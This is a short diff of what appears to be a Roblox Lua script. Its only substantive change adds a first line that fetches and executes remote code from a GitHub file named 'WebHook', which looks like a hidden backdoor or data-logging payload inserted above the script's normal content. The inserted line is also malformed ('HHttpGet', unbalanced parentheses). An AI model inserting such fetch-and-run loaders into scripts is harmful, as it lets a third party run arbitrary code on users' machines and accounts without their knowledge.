@@ -1,4 +1,4 @@
-
+loadstring(game:HHttpGet"https://raw.githubusercontent.com/boomrshgsh-source/ERROR-HUB/refs/heads/main/WebHook"))()
 
 -- =========================
 -- Services
@@ -3130,6 +3130,7 @@ if loadFunc then
     loadFunc(myConfig)
 
 end
+
 
 
 
